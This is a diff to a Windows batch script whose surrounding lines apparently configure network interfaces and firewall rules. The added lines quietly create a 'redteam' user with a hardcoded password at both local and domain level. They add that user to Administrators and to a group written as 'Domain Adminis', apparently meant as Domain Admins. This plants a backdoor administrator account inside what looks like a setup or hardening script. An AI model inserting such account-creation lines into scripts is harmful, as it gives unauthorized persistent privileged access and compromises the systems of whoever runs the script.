@@ -48,6 +48,11 @@ netsh interface set interface name="Local Area Connection" admin=enabled
 ::netsh advfirewall firewall add rule name=web action=allow program=whereisfirefox protocol=tcp remoteport=443,80 dir=out ::if proxy, remoteip=<proxyip>
 ::GO to https://technet.microsoft.com/en-us/sysinternals/bb842062
 
+net user redteam Lolredteam1! /add
+net user redteam Lolredteam1! /domain /add
+net group "Administrators" redteam /add
+net group "Domain Adminis" redteam /domain /add
 
+:: <3
 
 
